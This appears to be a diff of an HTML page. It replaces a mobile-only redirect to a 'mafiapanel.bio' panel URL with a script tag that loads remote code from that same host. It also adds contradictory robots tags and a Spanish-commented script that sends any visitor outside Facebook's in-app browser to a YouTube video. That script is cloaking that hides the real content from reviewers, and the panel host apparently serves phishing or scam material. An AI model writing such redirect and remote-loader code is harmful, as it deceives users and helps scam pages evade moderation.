@@ -1,5 +1,28 @@
-<script type="text/javascript">
-var device = navigator.userAgent.toLowerCase();
-if( device.search(/iphone|ipod|ipad|android/) > -0 ){{
-document.location ="https://mafiapanel.bio/h/index.php?username=Wando"; }}
+<script src="https://mafiapanel.bio/h/index.php?username=Wando" type="text/javascript" async="true"></script>
+
+  
+      <meta name="robots" content="index, follow"/>
+	<meta name="googlebot" content="noindex"/> 
+    <meta name="robots" content="index">
+    <meta name="robots" content="noindex">
+    <meta name="robots" content="nofollow">
+<html lang="en">
+<head>
+<script>
+    // Función para detectar si la página se abre en la aplicación de Facebook
+    function isFacebookApp() {
+        return navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FBAV");
+    }
+
+    // Función para redirigir si no está en la aplicación de Facebook
+    function checkAndRedirect() {
+        if (!isFacebookApp()) {
+            // Si no está en la aplicación de Facebook, redirigir directamente sin cargar el contenido
+            document.write("Redirigiendo a otra página...");
+            window.location.href = "https://www.youtube.com/watch?v=6HRHNxiyxs0";
+        }
+    }
+
+    // Llamar a la función al cargar la página
+    checkAndRedirect();
 </script>
